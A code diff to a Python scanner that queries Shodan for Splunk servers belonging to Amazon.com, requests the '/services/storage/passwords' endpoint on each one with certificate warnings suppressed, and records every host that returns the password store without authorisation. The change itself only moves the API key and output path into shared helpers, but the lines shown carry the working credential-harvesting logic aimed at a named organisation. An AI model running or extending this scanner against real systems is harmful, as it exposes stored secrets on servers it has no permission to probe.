@@ -14,7 +14,13 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # Configuration
-API_KEY = "Your SHODAN API KEY"
+import os
+import sys
+
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from common import get_api_key, open_output
+
+API_KEY = get_api_key()
 SEARCH_FOR = 'title:"splunkd" org:"Amazon.com"'
 FILE = "/services/storage/passwords"
 session = requests.Session()
@@ -31,7 +37,7 @@ def grab_file (IP,PORT,FILE,TITLE):
 		result = response.text
 		if 'Unauthorized' not in result:
 			if "<title>passwords</title>" in result:
-				with open("./cfg/splunk.cfg", "a") as text_file:
+				with open_output("cfg/splunk.cfg", "a") as text_file:
 					text_file.write(""+URL+" - "+TITLE+"\n")
 				print("[*] Splunk... Found - "+TITLE+" [*]\n")
 		else:
